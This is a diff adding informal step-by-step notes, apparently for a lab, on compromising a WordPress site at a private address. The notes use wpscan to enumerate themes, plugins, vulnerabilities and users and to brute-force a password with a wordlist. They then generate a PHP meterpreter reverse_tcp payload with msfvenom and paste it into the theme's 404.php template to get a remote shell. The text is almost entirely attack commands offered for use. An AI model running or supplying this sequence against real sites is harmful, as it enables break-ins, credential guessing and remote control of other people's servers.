@@ -1,0 +1,32 @@
+we move to wpscan directory
+
+1. we gonna scan wordpress first
+ruby ./wpscan.rb -u http://(ipaddress/domainname)
+
+2.we do enumerating for wordpress theme
+ruby ./wpscan.rb -u http://192.168.21.200/projek --enumerate t
+
+3.we scan vuln on theme
+ruby ./wpscan.rb -u http://192.168.21.200/projek --enumerate vt
+
+4.we scan plugin on wordpress
+ruby ./wpscan.rb -u http://192.168.21.200/projek --enumerate p
+
+5.we scan vuln plugin
+ruby ./wpscan.rb -u http://192.168.21.200/projek --enumerate vp
+
+6. create payload using php parameter
+msfvenom -p php/meterpreter/reverse_tcp lhost= lport=4444
+
+7.and we gonna scan user on wordpress
+ruby ./wpscan.rb -u http://192.168.21.200/projek --enumerate u
+
+8.create wordlist.txt
+ruby ./wpscan.rb -u http://192.168.21.200/projek/ --wordlist /root/Desktop/(worldlist.txt --username (name of username)
+
+9.go to template 404.php and copy code on payload php and paste it into 404.php template and save it
+
+10. exploit
+
+
+
